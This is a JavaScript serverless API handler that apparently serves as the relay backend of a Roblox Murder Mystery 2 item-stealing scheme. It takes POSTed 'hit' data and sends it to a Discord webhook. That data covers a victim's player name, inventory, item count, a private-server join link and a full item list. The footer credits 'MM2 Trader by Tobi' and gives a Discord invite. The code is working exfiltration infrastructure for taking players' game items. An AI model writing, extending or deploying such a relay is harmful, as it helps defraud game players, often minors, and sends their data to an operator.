export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  const API_KEY = 'your_really_secret_key_here';
  if (req.headers['x-api-key'] !== API_KEY) {
    return res.status(401).json({ error: 'Invalid API Key' });
  }

  const {
    webhook, plrName, plrDisplayName, receiver, inventoryText,
    items, fullhitUrl, job_id, joiner // <--- note: 'joiner' field expected
  } = req.body || {};

  if (!webhook || !/^https:\/\/discord\.com\/api\/webhooks\//.test(webhook)) {
    return res.status(400).json({ error: "Invalid or missing Discord webhook" });
  }

  const embedFields = [
    {
      name: "Player Information",
      value: [
        "```",
        `Name: ${plrName || "N/A"}`,
        `Display: ${plrDisplayName || "N/A"}`,
        `Receiver: ${receiver || "N/A"}`,
        "```"
      ].join('\n'),
      inline: false
    },
    {
      name: "Inventory",
      value: "```" + (inventoryText || "N/A") + "```",
      inline: false
    },
    {
      name: "List of items",
      value: "```Total Items: " + (Array.isArray(items) ? items.length : 0) + "```",
      inline: false
    },
    {
      name: "Join Link (Private)",
      value: joiner ? `[Join Server](${joiner})` : "N/A",
      inline: false
    },
    {
      name: "Full Item List",
      value: fullhitUrl ? `[View Complete List](${fullhitUrl})` : "`Paste creation failed`",
      inline: false
    }
  ];

  const embed = {
    title: "MM 2 Items!",
    color: 10181046,
    fields: embedFields,
    footer: {
      text: "MM2 Trader by Tobi. discord.gg/GY2RVSEGDT"
    },
    timestamp: new Date().toISOString()
  };

  const discordPayload = {
    content: "🎁 **MM2 Inventory Hit Report**",
    embeds: [embed]
  };

  const discordResp = await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(discordPayload)
  });

  if (discordResp.ok) {
    return res.status(200).json({ ok: true, message: "Embed sent to Discord." });
  } else {
    return res.status(500).json({ ok: false, error: "Failed to send embed to Discord." });
  }
}
